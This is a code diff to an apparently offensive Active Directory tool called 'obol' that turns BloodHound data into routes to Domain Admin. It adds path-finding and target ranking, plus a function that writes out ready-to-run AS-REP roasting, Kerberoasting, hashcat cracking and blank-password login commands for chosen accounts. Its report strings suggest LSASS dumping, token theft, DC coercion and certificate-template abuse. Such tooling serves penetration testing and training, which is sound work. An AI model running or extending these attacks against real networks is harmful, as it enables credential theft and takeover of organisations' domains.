@@ -412,31 +412,296 @@
     var found = [];
     var types = graph.types || {};
 
-    function dfs(node, path, visited) {
-      if (found.length >= maxPaths || path.length >= maxDepth) return;
-      var out = adj[node] || [];
+    // BREADTH-first over simple paths (FIFO), so goal-reaching paths come out shortest-first: a path
+    // is only ever extended by one hop, and a parent is dequeued before its children, so the first goal
+    // hit is a globally shortest route (its hop count matches nearestToGoal's). A plain DFS could fill
+    // maxPaths with long routes before reaching the short one and report a too-long "shortest". A node-
+    // expansion budget guards a dense graph. Every owned principal seeds the frontier.
+    var budget = opts.budget || 50000;
+    var q = [], spent = 0;
+    owned.forEach(function (sid) { var v = {}; v[sid] = 1; q.push({ node: sid, hops: [], visited: v }); });
+    for (var qi = 0; qi < q.length && found.length < maxPaths && spent < budget; qi++) {
+      var cur = q[qi]; spent++;
+      if (cur.hops.length >= maxDepth) continue;
+      var out = adj[cur.node] || [];
       for (var i = 0; i < out.length; i++) {
         var edge = out[i][0], dst = out[i][1];
-        if (visited[dst]) continue; // simple paths only (no cycles)
-        var hop = { from: names[node] || node, edge: edge, to: names[dst] || dst, to_kind: types[dst] || '' };
+        if (cur.visited[dst]) continue; // simple paths only (no cycles)
+        var hop = { from: names[cur.node] || cur.node, edge: edge, to: names[dst] || dst, to_kind: types[dst] || '' };
         if (goals[dst]) {
-          found.push(path.concat([hop]));
-          if (found.length >= maxPaths) return;
+          found.push(cur.hops.concat([hop]));
+          if (found.length >= maxPaths) break;
           continue; // a goal ends the path; don't extend past it
         }
-        var nv = Object.assign({}, visited); nv[dst] = 1;
-        dfs(dst, path.concat([hop]), nv);
+        var nv = Object.assign({}, cur.visited); nv[dst] = 1;
+        q.push({ node: dst, hops: cur.hops.concat([hop]), visited: nv });
       }
     }
-
-    for (var oi = 0; oi < owned.length; oi++) {
-      if (found.length >= maxPaths) break;
-      var start = {}; start[owned[oi]] = 1;
-      dfs(owned[oi], [], start);
-    }
     if (!found.length) return { paths: [], first: null };
-    found.sort(function (a, b) { return a.length - b.length; });
+    found.sort(function (a, b) { return a.length - b.length; }); // stable; BFS order is already shortest-first
     return { paths: found, first: firstAbusable(found[0]) };
+  }
+
+  // Shortest hop-count from every node to a Domain-Admin goal, via ONE reverse BFS over the same
+  // member+control adjacency ownedPaths walks (goal SIDs outward along reversed edges). This powers the
+  // "who is closest to Domain Admin" targeting board, general to any collection: it ranks which account to
+  // go after next. Returns [{name, type, hops}] nearest-first; the goals themselves are excluded.
+  function nearestToGoal(summary, opts) {
+    opts = opts || {};
+    var graph = (summary && summary._graph) || {};
+    var names = graph.names || {}, types = graph.types || {};
+    var goals = {};
+    if (graph.da_sid) goals[graph.da_sid] = 1;
+    if (graph.domain_sid) goals[graph.domain_sid] = 1;
+    var radj = {};
+    (graph.members || []).forEach(function (e) { (radj[e[1]] = radj[e[1]] || []).push(e[0]); });
+    (graph.control || []).forEach(function (e) { (radj[e[2]] = radj[e[2]] || []).push(e[0]); });
+    var dist = {}, q = [];
+    Object.keys(goals).forEach(function (g) { dist[g] = 0; q.push(g); });
+    for (var qi = 0; qi < q.length; qi++) {
+      var node = q[qi], d = dist[node];
+      (radj[node] || []).forEach(function (src) { if (dist[src] === undefined) { dist[src] = d + 1; q.push(src); } });
+    }
+    var out = [];
+    Object.keys(dist).forEach(function (sid) {
+      if (goals[sid] || dist[sid] === 0) return;
+      var t = types[sid] || '';
+      if (opts.types && opts.types.indexOf(t) < 0) return;
+      out.push({ name: names[sid] || sid, type: t, hops: dist[sid] });
+    });
+    out.sort(function (a, b) { return a.hops - b.hops || (a.name < b.name ? -1 : 1); });
+    return out;
+  }
+
+  // Forward reachability: everything a principal CONTROLS, directly or transitively (it is a member of a
+  // group that holds an abusable ACE, then that group's control, and so on). Mirrors ownedPaths' adjacency
+  // but walks OUTWARD from one principal and collects the control targets, so the tab can answer "if I owned
+  // X, what could I abuse" for ANY account in the collection, not just the creds you hold. Returns
+  // { principal, controls: [{name, type, edge, hops}], groups: [name], count }.
+  function controls(summary, principal, opts) {
+    opts = opts || {};
+    var maxDepth = opts.maxDepth || 8;
+    var graph = (summary && summary._graph) || {};
+    var names = graph.names || {}, types = graph.types || {};
+    var nameToSid = {};
+    Object.keys(names).forEach(function (sid) { var k = String(names[sid]).split('@')[0].toLowerCase(); if (!(k in nameToSid)) nameToSid[k] = sid; });
+    var start = nameToSid[String(principal == null ? '' : principal).split('@')[0].toLowerCase()];
+    if (!start) return { principal: principal, controls: [], groups: [], count: 0 };
+    var adj = {};
+    (graph.members || []).forEach(function (e) { (adj[e[0]] = adj[e[0]] || []).push(['MemberOf', e[1]]); });
+    (graph.control || []).forEach(function (e) { (adj[e[0]] = adj[e[0]] || []).push([e[1], e[2]]); });
+    var seen = {}; seen[start] = 1;
+    var q = [{ sid: start, hops: 0 }], ctrl = {}, groups = {};
+    for (var qi = 0; qi < q.length; qi++) {
+      var cur = q[qi]; if (cur.hops >= maxDepth) continue;
+      (adj[cur.sid] || []).forEach(function (pair) {
+        var edge = pair[0], dst = pair[1];
+        if (edge === 'MemberOf') { if (/group/.test(String(types[dst] || ''))) groups[names[dst] || dst] = 1; }
+        else if (!ctrl[dst] || ctrl[dst].hops > cur.hops + 1) ctrl[dst] = { name: names[dst] || dst, type: types[dst] || '', edge: edge, hops: cur.hops + 1 };
+        if (!seen[dst]) { seen[dst] = 1; q.push({ sid: dst, hops: cur.hops + 1 }); }
+      });
+    }
+    var list = Object.keys(ctrl).map(function (k) { return ctrl[k]; });
+    list.sort(function (a, b) { return a.hops - b.hops || (a.name < b.name ? -1 : 1); });
+    return { principal: principal, controls: list, groups: Object.keys(groups).sort(), count: list.length };
+  }
+
+  // The per-principal weaknesses the collection ITSELF indicates for one account: the flags
+  // BloodHound carried on it (SPN, DONT_REQ_PREAUTH, PASSWD_NOTREQD) plus the census roles it
+  // landed in. Shape-based membership check (short name, case-insensitive) against the already
+  // derived census lists, so it is general to any collection and needs no re-scan of the graph.
+  function principalProfile(summary, principal) {
+    summary = summary || {};
+    var g = summary._graph || {};
+    var names = g.names || {}, types = g.types || {};
+    var short = String(principal == null ? '' : principal).split('@')[0].toUpperCase();
+    function inList(list) {
+      return (list || []).some(function (x) { return String(x).split('@')[0].toUpperCase() === short; });
+    }
+    var sid = '', type = '';
+    Object.keys(names).forEach(function (s) {
+      if (String(names[s]).split('@')[0].toUpperCase() === short) { sid = s; type = types[s] || ''; }
+    });
+    return {
+      name: principal, short: short, sid: sid, type: type,
+      kerberoastable: inList(summary.kerberoastable),
+      asrep_roastable: inList(summary.asrep_roastable),
+      password_not_required: inList(summary.password_not_required),
+      dcsync: inList(summary.dcsync_principals),
+      unconstrained: inList(summary.unconstrained_delegation),
+      high_value: inList(summary.high_value),
+    };
+  }
+
+  // Data-INDICATED ways to acquire a non-owned account, drawn ONLY from that account's own
+  // BloodHound attributes (no generic host-enumeration noise): an SPN => Kerberoast, DONT_REQ_PREAUTH
+  // => AS-REP roast, PASSWD_NOTREQD => a blank-password check. Returns [{why, cmd}] (possibly empty,
+  // meaning the account has no self-evident weakness and must be reached over a control path instead).
+  // ctx fills the DC/domain, and ctx.you (an account you already own) authenticates the Kerberoast.
+  function acquisitionLines(summary, principal, ctx) {
+    ctx = ctx || {};
+    var p = principalProfile(summary, principal);
+    var dc = ctx.dc || '<dc-ip>';
+    var domain = (summary && summary.domain) || '<domain>';
+    var tgt = p.short;
+    var low = tgt.toLowerCase();
+    var you = ctx.you ? String(ctx.you).split('@')[0] : null;
+    var out = [];
+    if (p.asrep_roastable) {
+      out.push({ why: 'DONT_REQ_PREAUTH: AS-REP roast, no credential needed.',
+        cmd: 'impacket-GetNPUsers ' + domain + '/' + tgt + ' -no-pass -dc-ip ' + dc + ' -format hashcat' });
+      out.push({ why: 'Crack the AS-REP hash offline.',
+        cmd: 'hashcat -m 18200 ' + low + '.asrep /usr/share/wordlists/rockyou.txt' });
+    }
+    if (p.kerberoastable) {
+      var auth = (you ? (domain + '/' + you) : (domain + '/<youruser>')) + ":'<password>'";
+      out.push({ why: 'Has an SPN: Kerberoast (needs any one valid domain credential).',
+        cmd: 'impacket-GetUserSPNs ' + auth + ' -request-user ' + tgt + ' -dc-ip ' + dc });
+      out.push({ why: 'Crack the TGS hash offline.',
+        cmd: 'hashcat -m 13100 ' + low + '.kerb /usr/share/wordlists/rockyou.txt' });
+    }
+    if (p.password_not_required) {
+      out.push({ why: 'PASSWD_NOTREQD: may authenticate with a blank password, costs nothing to try.',
+        cmd: 'nxc smb ' + dc + ' -u ' + tgt + " -p ''" });
+    }
+    return out;
+  }
+
+  // Every named principal in the collection, ranked by closeness to Domain Admin (reusing
+  // nearestToGoal) then by name, so the tab can offer a "select an account to inspect" dropdown
+  // over ALL the data, not only the owned creds. opts.types filters by node type (plural, e.g.
+  // ['users','groups','computers']). hops is null for a principal with no derivable path to DA.
+  function principalList(summary, opts) {
+    opts = opts || {};
+    var g = (summary && summary._graph) || {};
+    var names = g.names || {}, types = g.types || {};
+    var hopMap = {};
+    (nearestToGoal(summary) || []).forEach(function (r) { hopMap[String(r.name).split('@')[0].toUpperCase()] = r.hops; });
+    var out = [], seen = {};
+    Object.keys(names).forEach(function (s) {
+      var t = types[s] || '';
+      if (opts.types && opts.types.indexOf(t) < 0) return;
+      var nm = names[s], short = String(nm).split('@')[0], key = short.toUpperCase();
+      if (!short || seen[key]) return; seen[key] = 1;
+      out.push({ name: nm, short: short, type: t, hops: (key in hopMap) ? hopMap[key] : null });
+    });
+    out.sort(function (a, b) {
+      var ah = a.hops == null ? Infinity : a.hops, bh = b.hops == null ? Infinity : b.hops;
+      return ah - bh || (a.short.toLowerCase() < b.short.toLowerCase() ? -1 : 1);
+    });
+    return out;
+  }
+
+  // Marginal-value targeting: of the accounts you do NOT own but could realistically GO GET (an SPN to
+  // Kerberoast, DONT_REQ_PREAUTH to AS-REP, PASSWD_NOTREQD to try blank), which one lands you closest to
+  // Domain Admin? This is the exam move BloodHound does not hand you: it shows paths, but not "which
+  // gettable credential most shortens my route, so that is who I go hunt." Ranked by how many hops owning
+  // the account would SAVE off your current shortest route, then by its own closeness to DA. Restricted to
+  // data-indicated weaknesses so it never becomes generic go-enumerate-everything noise.
+  function bestNextTargets(summary, ownedPrincipals, opts) {
+    opts = opts || {};
+    var limit = opts.limit || 8;
+    summary = summary || {};
+    var ownedSet = {};
+    (ownedPrincipals || []).forEach(function (o) { ownedSet[String(o).split('@')[0].toUpperCase()] = 1; });
+    var cur = ownedPaths(summary, ownedPrincipals || []);
+    var currentBest = (cur.paths && cur.paths[0]) ? cur.paths[0].length : null;
+    var hopMap = {};
+    (nearestToGoal(summary) || []).forEach(function (r) { hopMap[String(r.name).split('@')[0].toUpperCase()] = r.hops; });
+    var out = [], seen = {};
+    function consider(name) {
+      var short = String(name).split('@')[0].toUpperCase();
+      if (!short || seen[short] || ownedSet[short]) return; seen[short] = 1;
+      if (short === 'KRBTGT') return; // the KDC service account is flagged roastable but is never a real hunt target
+      var prof = principalProfile(summary, name);
+      var weaknesses = [];
+      if (prof.asrep_roastable) weaknesses.push('asrep');
+      if (prof.kerberoastable) weaknesses.push('kerberoast');
+      if (prof.password_not_required) weaknesses.push('blankpw');
+      if (!weaknesses.length) return; // only accounts you can actually go get
+      var hops = (short in hopMap) ? hopMap[short] : null;
+      var saves;
+      if (hops == null) saves = 0;
+      else if (currentBest == null) saves = hops; // opens a route where you had none: worth its hop count
+      else saves = Math.max(0, currentBest - hops);
+      out.push({ name: prof.name, short: prof.short, type: prof.type, hops: hops, weaknesses: weaknesses, saves: saves });
+    }
+    (summary.asrep_roastable || []).forEach(consider);
+    (summary.kerberoastable || []).forEach(consider);
+    (summary.password_not_required || []).forEach(consider);
+    out.sort(function (a, b) {
+      var s = b.saves - a.saves; if (s) return s;
+      var ah = a.hops == null ? Infinity : a.hops, bh = b.hops == null ? Infinity : b.hops;
+      return ah - bh || (a.short < b.short ? -1 : 1);
+    });
+    return { currentBest: currentBest, targets: out.slice(0, limit), total: out.length };
+  }
+
+  // ── collection diff (temporal: what changed between two SharpHound runs) ──────────────────
+  // A compact, comparable snapshot of a collection for diffing: the principals (SID -> name/type),
+  // the ABUSABLE control edges and MemberOf edges (the attack surface), and the high-signal census
+  // lists. Small (no raw objects), so a handful can be kept per engagement for a temporal diff.
+  function graphFingerprint(summary) {
+    var g = (summary && summary._graph) || {};
+    var names = g.names || {}, types = g.types || {};
+    var principals = {};
+    Object.keys(names).forEach(function (s) { principals[s] = { name: String(names[s]).split('@')[0], type: types[s] || '' }; });
+    return {
+      domain: (summary && summary.domain) || '', at: (summary && summary.ingested_at) || 0,
+      principals: principals,
+      control: (g.control || []).filter(function (e) { return ABUSABLE_ACE[e[1]]; }).map(function (e) { return [e[0], e[1], e[2]]; }),
+      members: (g.members || []).map(function (e) { return [e[0], e[1]]; }),
+      kerberoastable: (summary.kerberoastable || []).slice(),
+      asrep_roastable: (summary.asrep_roastable || []).slice(),
+      password_not_required: (summary.password_not_required || []).slice(),
+      dcsync_principals: (summary.dcsync_principals || []).slice(),
+      unconstrained_delegation: (summary.unconstrained_delegation || []).slice(),
+    };
+  }
+
+  // Diff two fingerprints (prev -> next): new/removed principals, new/removed abusable+MemberOf
+  // edges (the leverage that opened or closed), and the census-flag deltas (now Kerberoastable,
+  // no longer a DCSync principal, and so on). This is a temporal view BloodHound-CE does not give
+  // out of the box: re-collect after each foothold and obol says exactly what new leverage you earned.
+  function diffCollections(prev, next) {
+    if (!prev || !next) return null;
+    var pn = prev.principals || {}, nn = next.principals || {};
+    function nm(sid, src) { return (src[sid] && src[sid].name) ? src[sid].name : String(sid); }
+    var addedP = [], removedP = [];
+    Object.keys(nn).forEach(function (s) { if (!pn[s]) addedP.push(nn[s]); });
+    Object.keys(pn).forEach(function (s) { if (!nn[s]) removedP.push(pn[s]); });
+    function edgeIndex(fp) {
+      var idx = {};
+      (fp.control || []).forEach(function (e) { idx[e[0] + '|' + e[1] + '|' + e[2]] = { from: e[0], edge: e[1], to: e[2] }; });
+      (fp.members || []).forEach(function (e) { idx[e[0] + '|MemberOf|' + e[1]] = { from: e[0], edge: 'MemberOf', to: e[1] }; });
+      return idx;
+    }
+    var pe = edgeIndex(prev), ne = edgeIndex(next), addedE = [], removedE = [];
+    Object.keys(ne).forEach(function (k) { if (!pe[k]) { var e = ne[k]; addedE.push({ from: nm(e.from, nn), edge: e.edge, to: nm(e.to, nn) }); } });
+    Object.keys(pe).forEach(function (k) { if (!ne[k]) { var e = pe[k]; removedE.push({ from: nm(e.from, pn), edge: e.edge, to: nm(e.to, pn) }); } });
+    function flagDiff(key) {
+      var ps = {}, ns = {}, add = [], rem = [];
+      (prev[key] || []).forEach(function (x) { ps[String(x).split('@')[0]] = 1; });
+      (next[key] || []).forEach(function (x) { ns[String(x).split('@')[0]] = 1; });
+      Object.keys(ns).forEach(function (x) { if (!ps[x]) add.push(x); });
+      Object.keys(ps).forEach(function (x) { if (!ns[x]) rem.push(x); });
+      return { added: add.sort(), removed: rem.sort() };
+    }
+    var flags = {
+      dcsync_principals: flagDiff('dcsync_principals'),
+      kerberoastable: flagDiff('kerberoastable'),
+      asrep_roastable: flagDiff('asrep_roastable'),
+      password_not_required: flagDiff('password_not_required'),
+      unconstrained_delegation: flagDiff('unconstrained_delegation'),
+    };
+    var changed = !!(addedP.length || removedP.length || addedE.length || removedE.length
+      || Object.keys(flags).some(function (k) { return flags[k].added.length || flags[k].removed.length; }));
+    return {
+      changed: changed, from_at: prev.at, to_at: next.at,
+      principals: { added: addedP, removed: removedP },
+      edges: { added: addedE, removed: removedE },
+      flags: flags,
+    };
   }
 
   // ── graph projection for the tab / report ────────────────────────────────────────────────
@@ -561,46 +826,44 @@
     }
 
     sec('asrep', 'AS-REP Roastable Users',
-        'DONT_REQ_PREAUTH accounts — request the AS-REP and crack it offline, no credential needed.',
+        'DONT_REQ_PREAUTH accounts, request the AS-REP and crack it offline, no credential needed.',
         summary.asrep_roastable, 'obol AS-REP roasts + cracks these automatically');
     sec('kerberoast', 'Kerberoastable Users',
-        'Accounts with an SPN — request a TGS ticket and crack it offline.',
+        'Accounts with an SPN, request a TGS ticket and crack it offline.',
         summary.kerberoastable, 'obol Kerberoasts these');
-    sec('da', 'Domain Admins', 'Full control of the domain — the usual objective.', summary.domain_admins);
+    sec('da', 'Domain Admins', 'Full control of the domain, the usual objective.', summary.domain_admins);
     sec('ea', 'Enterprise Admins', 'Forest-wide control (all domains).', summary.enterprise_admins);
     sec('dcsync', 'Can DCSync the Domain', 'Principals holding replication rights (or the ACL to grant '
-        + 'them) on the domain object — they can already pull every hash. Where you land, this is the win.',
+        + 'them) on the domain object, they can already pull every hash. Where you land, this is the win.',
         summary.dcsync_principals, 'obol secretsdumps once you become one of these');
     sec('unconstrained', 'Unconstrained Delegation', 'Computers that cache any authenticating user’s TGT '
-        + '— coerce a DC to authenticate, capture its TGT, and you own the domain.',
+        + 'coerce a DC to authenticate, capture its TGT, and you own the domain.',
         summary.unconstrained_delegation, 'obol coerces + captures the TGT');
     sec('adminto', 'Domain Users → Local Admin', 'Hosts where a broad, low-privilege group is a local '
-        + 'administrator — instant lateral movement with any domain account.',
+        + 'administrator, instant lateral movement with any domain account.',
         summary.admin_to, 'log in and dump credentials');
-    sec('sessions', 'Where a Domain Admin Is Logged In', 'Live DA sessions — land on this host and steal '
+    sec('sessions', 'Where a Domain Admin Is Logged In', 'Live DA sessions, land on this host and steal '
         + 'the token or credentials in memory.', summary.da_sessions, 'token-impersonate or dump LSASS');
-    sec('rdp', 'Can RDP', 'Principals who can open an RDP session (Remote Desktop Users) — a way onto '
+    sec('rdp', 'Can RDP', 'Principals who can open an RDP session (Remote Desktop Users), a way onto '
         + 'a host with a credential you hold.', summary.can_rdp, 'xfreerdp / nxc rdp');
     sec('winrm', 'Can WinRM', 'Principals who can open a WinRM / evil-winrm shell (Remote Management Users).',
         summary.can_winrm, 'evil-winrm / nxc winrm');
-    sec('rdp_reach', 'Broad RDP Reach → Host', 'Hosts where a broad, low-privilege group can RDP in — '
-        + 'instant lateral movement with any domain credential.', summary.rdp_reach, 'xfreerdp / nxc rdp to that host');
+    sec('rdp_reach', 'Broad RDP Reach → Host', 'Hosts where a broad, low-privilege group can RDP in, instant lateral movement with any domain credential.', summary.rdp_reach, 'xfreerdp / nxc rdp to that host');
     sec('psremote_reach', 'Broad PSRemote Reach → Host', 'Hosts where a broad group can open a WinRM / '
-        + 'PSRemote shell — a shell on that host with any domain credential.', summary.psremote_reach,
+        + 'PSRemote shell, a shell on that host with any domain credential.', summary.psremote_reach,
         'evil-winrm / nxc winrm to that host');
     sec('dcom_reach', 'Broad DCOM Reach → Host', 'Hosts where a broad group is in Distributed COM Users '
-        + '— MMC20/ShellWindows DCOM code execution with any domain credential.', summary.dcom_reach,
+        + 'MMC20/ShellWindows DCOM code execution with any domain credential.', summary.dcom_reach,
         'impacket-dcomexec to that host');
     sec('foreign', 'Foreign Principals (cross-trust)', 'Group members whose SID belongs to another domain '
-        + '— a foreign security principal reached over a trust; membership of a privileged group is a '
+        + 'a foreign security principal reached over a trust; membership of a privileged group is a '
         + 'cross-domain route to control.', summary.foreign_principals);
     sec('esc', 'Vulnerable Cert Templates (AD CS)', 'ESC1-shape templates: client-auth certificates whose '
-        + 'enrollee supplies the subject — request one AS a Domain Admin and authenticate as them.',
+        + 'enrollee supplies the subject, request one AS a Domain Admin and authenticate as them.',
         summary.esc_templates, 'certipy req → PKINIT / UnPAC-the-hash');
-    sec('passwordnotreqd', 'Password Not Required', 'Accounts flagged PASSWD_NOTREQD — may authenticate '
+    sec('passwordnotreqd', 'Password Not Required', 'Accounts flagged PASSWD_NOTREQD, may authenticate '
         + 'with a BLANK password. Try it first, it costs nothing.', summary.password_not_required, "nxc with -p ''");
-    sec('pwdneverexpires', 'Password Never Expires', 'Accounts whose password never expires — stale, '
-        + 'high-value crack/spray targets.', summary.pwd_never_expires);
+    sec('pwdneverexpires', 'Password Never Expires', 'Accounts whose password never expires, stale high-value crack/spray targets.', summary.pwd_never_expires);
     sec('highvalue', 'High-Value Targets', 'Objects BloodHound marks high-value.', summary.high_value);
     sec('computers', 'Computers', 'Domain-joined hosts in the collection.', summary.computers);
 
@@ -621,10 +884,10 @@
     var headline;
     if (paths.length) {
       var goal = paths[0].hops[paths[0].hops.length - 1].to;
-      headline = paths.length + ' path(s) from a principal you own to ' + goal + ' — the shortest is '
+      headline = paths.length + ' path(s) from a principal you own to ' + goal + '. The shortest is '
         + paths[0].length + ' hop(s). obol’s ACL-abuse move walks it automatically.';
     } else if (summary.domain || (summary.files && summary.files.length) || summary.users) {
-      headline = 'No owned→Domain-Admins path derived from this collection — start from the high-value '
+      headline = 'No owned→Domain-Admins path derived from this collection, start from the high-value '
         + 'queries below (a DCSync principal, an unconstrained-delegation host, or a broad local-admin edge is '
         + 'usually the way in). Enter a principal you own to derive the route.';
     } else {
@@ -678,7 +941,7 @@
       + ' ' + p(d.getUTCHours()) + ':' + p(d.getUTCMinutes()) + ' UTC';
   }
 
-  // A self-contained, printable PlumHound-style HTML report — the attack path(s) obol surmised
+  // A self-contained, printable PlumHound-style HTML report, the attack path(s) obol surmised
   // plus every high-value canned query. No external assets, no neo4j; opens in a browser or
   // downloads as one file. `view` is optional; when omitted it is computed from the summary.
   function domainReportHtml(summary, view) {
@@ -690,7 +953,7 @@
     var parts = [];
     if (!v.collected) parts.push('<div class="empty">No BloodHound collection ingested yet.</div>');
     if (an.headline) {
-      parts.push('<h2>Attack analysis — route to Domain Admins</h2>');
+      parts.push('<h2>Attack analysis, route to Domain Admins</h2>');
       parts.push('<div class="analysis"><div>' + esc(an.headline) + '</div>');
       (an.paths || []).forEach(function (p, i) {
         var hops = p.hops || [];
@@ -710,7 +973,7 @@
       if (s.count) {
         var rows = s.items.map(function (it) { return '<tr><td>' + esc(it) + '</td></tr>'; }).join('');
         parts.push('<table><tr><th>' + esc(s.title) + '</th></tr>' + rows + '</table>');
-        if (s.cash) parts.push('<div class="cash">⚡ ' + esc(s.cash) + '</div>');
+        if (s.cash) parts.push('<div class="cash">' + (OBOL.ic ? OBOL.ic('bolt') : '') + ' ' + esc(s.cash) + '</div>');
       } else {
         parts.push('<div class="empty">None in this collection.</div>');
       }
@@ -722,9 +985,9 @@
       }
     });
     return '<!doctype html><html><head><meta charset="utf-8">'
-      + '<title>Domain analysis — ' + dom + '</title><style>' + REPORT_CSS + '</style></head><body><div class="wrap">'
+      + '<title>Domain analysis: ' + dom + '</title><style>' + REPORT_CSS + '</style></head><body><div class="wrap">'
       + '<header><h1>Domain analysis · ' + dom + '</h1>'
-      + '<div class="sub">obol — BloodHound analysis &amp; escalation report · ingested ' + when + '</div>'
+      + '<div class="sub">obol, BloodHound analysis &amp; escalation report · ingested ' + when + '</div>'
       + '<div class="kpis">' + kpis + '</div></header>'
       + parts.join('')
       + '<footer>Generated by obol from a BloodHound collection · every path is a lead over collected edges, '
@@ -914,6 +1177,14 @@
     // analysis (pure)
     deriveCensus: deriveCensus,
     ownedPaths: ownedPaths,
+    nearestToGoal: nearestToGoal,
+    controls: controls,
+    principalProfile: principalProfile,
+    acquisitionLines: acquisitionLines,
+    principalList: principalList,
+    bestNextTargets: bestNextTargets,
+    graphFingerprint: graphFingerprint,
+    diffCollections: diffCollections,
     pathsToGraph: pathsToGraph,
     domainView: domainView,
     domainActionCommands: domainActionCommands,
